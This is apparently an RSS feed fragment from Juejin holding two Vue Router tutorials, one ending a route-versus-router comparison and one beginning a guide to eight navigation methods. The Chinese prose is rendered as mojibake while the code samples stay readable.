      <span class="hljs-title function_">next</span>(<span class="hljs-function"><span class="hljs-params">vm</span> =&gt;</span> {
        vm.<span class="hljs-property">user</span> = userData
      })
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/error'</span>)
    }
  },
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">beforeRouteUpdate</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// è·¯ç”±å‚æ•°å˜åŒ–æ—¶æ›´æ–°æ•°æ®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
    <span class="hljs-title function_">next</span>()
  }
}
</code></pre>
<h4 data-id="heading-18">7.3 è·¯ç”±çŠ¶æ€æŒä¹…åŒ–</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿å­˜è·¯ç”±çŠ¶æ€åˆ° localStorage</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes
})

<span class="hljs-comment">// è·¯ç”±å˜åŒ–æ—¶ä¿å­˜çŠ¶æ€</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to</span>) =&gt;</span> {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'lastRoute'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    <span class="hljs-attr">path</span>: to.<span class="hljs-property">path</span>,
    <span class="hljs-attr">query</span>: to.<span class="hljs-property">query</span>,
    <span class="hljs-attr">params</span>: to.<span class="hljs-property">params</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
  }))
})

<span class="hljs-comment">// åº”ç”¨å¯åŠ¨æ—¶æ¢å¤çŠ¶æ€</span>
router.<span class="hljs-title function_">isReady</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> saved = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'lastRoute'</span>)
  <span class="hljs-keyword">if</span> (saved) {
    <span class="hljs-keyword">const</span> lastRoute = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(saved)
    <span class="hljs-comment">// æ ¹æ®ä¿å­˜çš„çŠ¶æ€åšä¸€äº›å¤„ç†</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸Šæ¬¡è®¿é—®:'</span>, lastRoute.<span class="hljs-property">path</span>)
  }
})

<span class="hljs-comment">// ç»„ä»¶å†…ä½¿ç”¨ route è·å–çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
    <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
    
    <span class="hljs-comment">// ä¿å­˜è¡¨å•çŠ¶æ€åˆ°è·¯ç”± query</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">saveFormState</span> = (<span class="hljs-params">formData</span>) =&gt; {
      router.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">query</span>: {
          ...route.<span class="hljs-property">query</span>,
          <span class="hljs-attr">form</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(formData)
        }
      })
    }
    
    <span class="hljs-comment">// ä»è·¯ç”± query æ¢å¤è¡¨å•çŠ¶æ€</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadFormState</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (route.<span class="hljs-property">query</span>.<span class="hljs-property">form</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(route.<span class="hljs-property">query</span>.<span class="hljs-property">form</span>)
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-keyword">return</span> { saveFormState, loadFormState }
  }
}
</code></pre>
<h3 data-id="heading-19">å…«ã€TypeScript ç±»å‹æ”¯æŒ</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸º route å’Œ router æ·»åŠ ç±»å‹æ”¯æŒ</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RouteLocationNormalized</span>, <span class="hljs-title class_">Router</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-comment">// æ‰©å±• Route Meta ç±»å‹</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'vue-router'</span> {
  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RouteMeta</span> {
    <span class="hljs-comment">// è‡ªå®šä¹‰å…ƒå­—æ®µ</span>
    requiresAuth?: <span class="hljs-built_in">boolean</span>
    permissions?: <span class="hljs-built_in">string</span>[]
    breadcrumb?: <span class="hljs-built_in">string</span>
    title?: <span class="hljs-built_in">string</span>
    keepAlive?: <span class="hljs-built_in">boolean</span>
  }
}

<span class="hljs-comment">// ç»„ä»¶å†…ä½¿ç”¨ç±»å‹</span>
<span class="hljs-keyword">import</span> { useRoute, useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineComponent</span>({
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>() <span class="hljs-keyword">as</span> <span class="hljs-title class_">RouteLocationNormalized</span>
    <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>() <span class="hljs-keyword">as</span> <span class="hljs-title class_">Router</span>
    
    <span class="hljs-comment">// ç±»å‹å®‰å…¨çš„å‚æ•°è®¿é—®</span>
    <span class="hljs-keyword">const</span> userId = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// params ç±»å‹ä¸º Record&lt;string, string | string[]&gt;</span>
      <span class="hljs-keyword">const</span> id = route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(id)) {
        <span class="hljs-keyword">return</span> id[<span class="hljs-number">0</span>] <span class="hljs-comment">// å¤„ç†æ•°ç»„æƒ…å†µ</span>
      }
      <span class="hljs-keyword">return</span> id || <span class="hljs-string">''</span>
    })
    
    <span class="hljs-comment">// ç±»å‹å®‰å…¨çš„æŸ¥è¯¢å‚æ•°</span>
    <span class="hljs-keyword">const</span> page = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> pageStr = route.<span class="hljs-property">query</span>.<span class="hljs-property">page</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(pageStr)) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(pageStr[<span class="hljs-number">0</span>]) || <span class="hljs-number">1</span>
      }
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(pageStr || <span class="hljs-string">'1'</span>)
    })
    
    <span class="hljs-comment">// ç±»å‹å®‰å…¨çš„å¯¼èˆª</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">navigateToUser</span> = (<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) =&gt; {
      router.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,
        <span class="hljs-attr">params</span>: { id },  <span class="hljs-comment">// ç±»å‹æ£€æŸ¥</span>
        <span class="hljs-attr">query</span>: { <span class="hljs-attr">tab</span>: <span class="hljs-string">'info'</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span> }  <span class="hljs-comment">// å­—é¢é‡ç±»å‹</span>
      })
    }
    
    <span class="hljs-keyword">return</span> { userId, page, navigateToUser }
  }
})
</code></pre>
<h3 data-id="heading-20">ä¹ã€è®°å¿†å£è¯€ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-21">9.1 è®°å¿†å£è¯€</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/*
å£è¯€ä¸€ï¼š
route æ˜¯ "çœ‹" - çœ‹æˆ‘åœ¨å“ªï¼Œçœ‹æœ‰ä»€ä¹ˆå‚æ•°
router æ˜¯ "åŠ¨" - åŠ¨å»å“ªï¼ŒåŠ¨æ€ä¹ˆå»

å£è¯€äºŒï¼š
route ä¸‰è¦ç´ ï¼šparamsã€queryã€meta
router ä¸‰åŠ¨ä½œï¼špushã€replaceã€go

å£è¯€ä¸‰ï¼š
è¯»ä¿¡æ¯æ‰¾ routeï¼Œæ”¹è·¯ç”±æ‰¾ router
æŸ¥çŠ¶æ€ç”¨ routeï¼Œå˜çŠ¶æ€ç”¨ router
*/</span>
</code></pre>
<h4 data-id="heading-22">9.2 æœ€ä½³å®è·µæ¸…å•</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> bestPractices = {
  <span class="hljs-attr">route</span>: [
    <span class="hljs-string">'âœ… ä½¿ç”¨è®¡ç®—å±æ€§åŒ…è£… route å±æ€§'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ watch ç›‘å¬ç‰¹å®šå‚æ•°å˜åŒ–'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ route.meta è¿›è¡Œæƒé™åˆ¤æ–­'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ route.matched è·å–åµŒå¥—è·¯ç”±ä¿¡æ¯'</span>,
    <span class="hljs-string">'âŒ ä¸è¦ç›´æ¥ä¿®æ”¹ route å¯¹è±¡'</span>,
    <span class="hljs-string">'âŒ é¿å…æ·±åº¦ç›‘å¬æ•´ä¸ª route å¯¹è±¡'</span>
  ],
  
  <span class="hljs-attr">router</span>: [
    <span class="hljs-string">'âœ… ä½¿ç”¨å‘½åè·¯ç”±ä»£æ›¿è·¯å¾„å­—ç¬¦ä¸²'</span>,
    <span class="hljs-string">'âœ… ç¼–ç¨‹å¼å¯¼èˆªæ—¶ä¼ é€’å®Œæ•´çš„è·¯ç”±å¯¹è±¡'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ router.isReady() ç­‰å¾…è·¯ç”±å°±ç»ª'</span>,
    <span class="hljs-string">'âœ… åŠ¨æ€è·¯ç”±æ·»åŠ åæ£€æŸ¥æ˜¯å¦å­˜åœ¨'</span>,
    <span class="hljs-string">'âŒ ä¸è¦æ··ç”¨ window.location å’Œ router'</span>,
    <span class="hljs-string">'âŒ é¿å…åœ¨å¾ªç¯ä¸­é¢‘ç¹è°ƒç”¨ router æ–¹æ³•'</span>
  ],
  
  <span class="hljs-attr">combined</span>: [
    <span class="hljs-string">'âœ… route è·å–ä¿¡æ¯ï¼Œrouter æ‰§è¡Œæ“ä½œ'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ router.currentRoute è·å–å½“å‰è·¯ç”±'</span>,
    <span class="hljs-string">'âœ… åœ¨è·¯ç”±å®ˆå«ä¸­ç»“åˆä¸¤è€…è¿›è¡Œå¤æ‚é€»è¾‘'</span>,
    <span class="hljs-string">'âœ… ä½¿ç”¨ TypeScript å¢å¼ºç±»å‹å®‰å…¨'</span>
  ]
}
</code></pre>
<h3 data-id="heading-23">æ€»ç»“</h3>
<p><strong>route å’Œ router çš„æ ¸å¿ƒåŒºåˆ«æ€»ç»“ï¼š</strong></p>



































<table><thead><tr><th>æ–¹é¢</th><th>route</th><th>router</th></tr></thead><tbody><tr><td><strong>è§’è‰²</strong></td><td>ä¿¡æ¯æä¾›è€…</td><td>è¡ŒåŠ¨æ‰§è¡Œè€…</td></tr><tr><td><strong>æ•°æ®</strong></td><td>å½“å‰è·¯ç”±çŠ¶æ€å¿«ç…§</td><td>è·¯ç”±æ“ä½œæ–¹æ³•é›†åˆ</td></tr><tr><td><strong>ä¿®æ”¹</strong></td><td>åªè¯»ä¸å¯å˜</td><td>å¯å˜å¯æ“ä½œ</td></tr><tr><td><strong>ç±»æ¯”</strong></td><td>GPS å®šä½ä¿¡æ¯</td><td>å¯¼èˆªç³»ç»ŸæŒ‡ä»¤</td></tr><tr><td><strong>å¿ƒæ€</strong></td><td>"æˆ‘ç°åœ¨åœ¨å“ªï¼Ÿ"</td><td>"æˆ‘è¦å»å“ªé‡Œï¼Ÿæ€ä¹ˆå»ï¼Ÿ"</td></tr></tbody></table>
<p><strong>é»„é‡‘æ³•åˆ™ï¼š</strong></p>
<ul>
<li><strong>è¯»ä¿¡æ¯</strong> â†’ ç”¨ <code>route</code></li>
<li><strong>åšè·³è½¬</strong> â†’ ç”¨ <code>router</code></li>
<li><strong>æ”¹çŠ¶æ€</strong> â†’ é€šè¿‡ <code>router</code> æ”¹å˜ï¼Œä» <code>route</code> è¯»å–ç»“æœ</li>
</ul>
<p>è®°ä½ï¼š<code>route</code> å‘Šè¯‰ä½  <strong>ç°åœ¨</strong>ï¼Œ<code>router</code> å¸¦ä½ å» <strong>æœªæ¥</strong>ã€‚åˆ†æ¸…å®ƒä»¬ï¼Œä½ çš„ Vue Router ä½¿ç”¨å°†æ›´åŠ å¾—å¿ƒåº”æ‰‹ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue è·¯ç”±è·³è½¬å®Œå…¨æŒ‡å—ï¼š8ç§è·³è½¬æ–¹å¼æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7595289498446364698</link>    <guid>https://juejin.cn/post/7595289498446364698</guid>    <pubDate>2026-01-15T08:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595289498446364698" data-draft-id="7595365551607250995" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue è·¯ç”±è·³è½¬å®Œå…¨æŒ‡å—ï¼š8ç§è·³è½¬æ–¹å¼æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-15T08:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue è·¯ç”±è·³è½¬å®Œå…¨æŒ‡å—ï¼š8ç§è·³è½¬æ–¹å¼æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:51:44.000Z" title="Thu Jan 15 2026 08:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue è·¯ç”±è·³è½¬å®Œå…¨æŒ‡å—ï¼š8ç§è·³è½¬æ–¹å¼æ·±åº¦è§£æ</h2>
<blockquote>
<p>Vue Router æä¾›äº†ä¸°å¯Œçµæ´»çš„è·¯ç”±è·³è½¬æ–¹å¼ï¼Œä»æœ€ç®€å•çš„é“¾æ¥åˆ°æœ€å¤æ‚çš„ç¼–ç¨‹å¼å¯¼èˆªã€‚æœ¬æ–‡å°†å…¨é¢è§£ææ‰€æœ‰è·³è½¬æ–¹å¼ï¼Œå¹¶ç»™å‡ºæœ€ä½³å®è·µå»ºè®®ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€å¿«é€Ÿæ¦‚è§ˆï¼š8ç§è·³è½¬æ–¹å¼å¯¹æ¯”</h3>



























































<table><thead><tr><th>æ–¹å¼</th><th>ç±»å‹</th><th>ç‰¹ç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>1. <code>&lt;router-link&gt;</code></td><td>å£°æ˜å¼</td><td>æœ€ç®€å•ï¼Œè¯­ä¹‰åŒ–</td><td>èœå•ã€å¯¼èˆªé“¾æ¥</td></tr><tr><td>2. <code>router.push()</code></td><td>ç¼–ç¨‹å¼</td><td>çµæ´»ï¼Œå¯å¸¦å‚æ•°</td><td>æŒ‰é’®ç‚¹å‡»ã€æ¡ä»¶è·³è½¬</td></tr><tr><td>3. <code>router.replace()</code></td><td>ç¼–ç¨‹å¼</td><td>æ›¿æ¢å†å²è®°å½•</td><td>ç™»å½•åè·³è½¬ã€è¡¨å•æäº¤</td></tr><tr><td>4. <code>router.go()</code></td><td>ç¼–ç¨‹å¼</td><td>å†å²è®°å½•å¯¼èˆª</td><td>å‰è¿›åé€€ã€é¢åŒ…å±‘</td></tr><tr><td>5. å‘½åè·¯ç”±</td><td>å£°æ˜å¼/ç¼–ç¨‹å¼</td><td>è§£è€¦è·¯å¾„</td><td>å¤§å‹é¡¹ç›®ã€é‡æ„å‹å¥½</td></tr><tr><td>6. è·¯ç”±åˆ«å</td><td>å£°æ˜å¼</td><td>å¤šä¸ªè·¯å¾„æŒ‡å‘åŒä¸€è·¯ç”±</td><td>å…¼å®¹æ—§URLã€SEOä¼˜åŒ–</td></tr><tr><td>7. é‡å®šå‘</td><td>é…ç½®å¼</td><td>è‡ªåŠ¨è·³è½¬</td><td>é»˜è®¤è·¯ç”±ã€æƒé™æ§åˆ¶</td></tr><tr><td>8. å¯¼èˆªå®ˆå«</td><td>æ‹¦æˆªå¼</td><td>æ§åˆ¶è·³è½¬æµç¨‹</td><td>æƒé™éªŒè¯ã€æ•°æ®é¢„å–</td></tr></tbody></table>
<h3 data-id="heading-2">äºŒã€å£°æ˜å¼å¯¼èˆªï¼š<code>&lt;router-link&gt;</code></h3>
<h4 data-id="heading-3">2.1 åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="navigation"&gt;
    &lt;!-- 1. åŸºç¡€è·¯å¾„è·³è½¬ --&gt;
    &lt;router-link to="/home"&gt;é¦–é¡µ&lt;/router-link&gt;
    
    &lt;!-- 2. å¸¦æŸ¥è¯¢å‚æ•° --&gt;
    &lt;router-link to="/user?tab=profile&amp;page=2"&gt;
      ç”¨æˆ·ï¼ˆç¬¬2é¡µï¼‰
    &lt;/router-link&gt;
    
    &lt;!-- 3. å¸¦å“ˆå¸Œ --&gt;
    &lt;router-link to="/about#team"&gt;å…³äºæˆ‘ä»¬ï¼ˆå›¢é˜Ÿï¼‰&lt;/router-link&gt;
    
    &lt;!-- 4. åŠ¨æ€è·¯å¾„ --&gt;
    &lt;router-link :to="`/product/${productId}`"&gt;
      äº§å“è¯¦æƒ…
    &lt;/router-link&gt;
    
    &lt;!-- 5. è‡ªå®šä¹‰æ¿€æ´»æ ·å¼ --&gt;
    &lt;router-link 
      to="/dashboard" 
      active-class="active-link"
      exact-active-class="exact-active"
    &gt;
      æ§åˆ¶é¢æ¿
    &lt;/router-link&gt;
    
    &lt;!-- 6. æ›¿æ¢å†å²è®°å½• --&gt;
    &lt;router-link to="/login" replace&gt;
      ç™»å½•ï¼ˆæ— è¿”å›ï¼‰
    &lt;/router-link&gt;
    
    &lt;!-- 7. è‡ªå®šä¹‰æ ‡ç­¾ --&gt;
    &lt;router-link to="/help" custom v-slot="{ navigate, isActive }"&gt;
      &lt;button 
        @click="navigate" 
        :class="{ active: isActive }"
        class="custom-button"
      &gt;
        å¸®åŠ©ä¸­å¿ƒ
      &lt;/button&gt;
    &lt;/router-link&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      productId: 123
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.active-link {
  color: #1890ff;
  font-weight: bold;
}

.exact-active {
  border-bottom: 2px solid #1890ff;
}

.custom-button {
  padding: 8px 16px;
  background: #f5f5f5;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.custom-button.active {
  background: #1890ff;
  color: white;
}
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-4">2.2 é«˜çº§ç‰¹æ€§</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- 1. äº‹ä»¶ç›‘å¬ --&gt;
  &lt;router-link 
    to="/cart" 
    @click="handleClick"
    @mouseenter="handleHover"
  &gt;
    è´­ç‰©è½¦
  &lt;/router-link&gt;
  
  &lt;!-- 2. ç¦æ­¢è·³è½¬ --&gt;
  &lt;router-link 
    to="/restricted" 
    :event="hasPermission ? 'click' : ''"
    :class="{ disabled: !hasPermission }"
  &gt;
    ç®¡ç†å‘˜å…¥å£
  &lt;/router-link&gt;
  
  &lt;!-- 3. ç»„åˆå¼APIä½¿ç”¨ --&gt;
  &lt;router-link 
    v-for="nav in navList" 
    :key="nav.path"
    :to="nav.path"
    :class="getNavClass(nav)"
  &gt;
    {{ nav.name }}
    &lt;span v-if="nav.badge" class="badge"&gt;{{ nav.badge }}&lt;/span&gt;
  &lt;/router-link&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { computed } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()
const hasPermission = computed(() =&gt; true) // æƒé™é€»è¾‘

const navList = [
  { path: '/', name: 'é¦–é¡µ', exact: true },
  { path: '/products', name: 'äº§å“', badge: 'New' },
  { path: '/about', name: 'å…³äº' }
]

const getNavClass = (nav) =&gt; {
  const isActive = nav.exact 
    ? route.path === nav.path
    : route.path.startsWith(nav.path)
  
  return {
    'nav-item': true,
    'nav-active': isActive,
    'has-badge': !!nav.badge
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€ç¼–ç¨‹å¼å¯¼èˆª</h3>
<h4 data-id="heading-6">3.1 <code>router.push()</code> - æœ€å¸¸ç”¨çš„è·³è½¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ–¹æ³•1ï¼šè·¯å¾„å­—ç¬¦ä¸²</span>
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/home'</span>)
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/user/123'</span>)
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/search?q=vue'</span>)
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/about#contact'</span>)

<span class="hljs-comment">// æ–¹æ³•2ï¼šè·¯ç”±å¯¹è±¡ï¼ˆæ¨èï¼‰</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/123'</span>
})

<span class="hljs-comment">// æ–¹æ³•3ï¼šå‘½åè·¯ç”±ï¼ˆæœ€ä½³å®è·µï¼‰</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,
  <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> }
})

<span class="hljs-comment">// æ–¹æ³•4ï¼šå¸¦æŸ¥è¯¢å‚æ•°</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/search'</span>,
  <span class="hljs-attr">query</span>: {
